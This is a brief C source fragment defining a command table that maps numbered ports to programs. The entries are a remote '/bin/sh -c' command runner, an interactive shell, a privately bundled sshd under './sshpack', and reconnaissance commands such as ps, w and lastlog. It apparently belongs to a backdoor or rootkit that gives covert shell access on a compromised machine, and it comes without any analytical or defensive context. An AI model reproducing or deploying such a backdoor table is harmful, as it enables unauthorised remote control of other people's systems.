#define ARGCMAX 16
#define RCMD_PORT 254


struct cmd_opt {
    int             port;
    char           *argv[ARGCMAX];
    int fd; 
};

struct cmd_opt CMDS[] = {

    /*
     * remote cmd entry
     */

    {RCMD_PORT, { "/bin/sh", "-c", NULL,  NULL}},

    /*
     * port, argv[]
     * port must be != RCMD_PORT
     */

    {0, {"/bin/sh", "-i", NULL}},
    {1, {"./sshpack/sbin/sshd", "-i", NULL}},
    {2, {"ps", "ax", NULL}},
    {3, {"w", NULL}},
    {4, {"uptime", NULL}},
    {5, {"lastlog", NULL}},

    { -1, { NULL }, -1 }

};
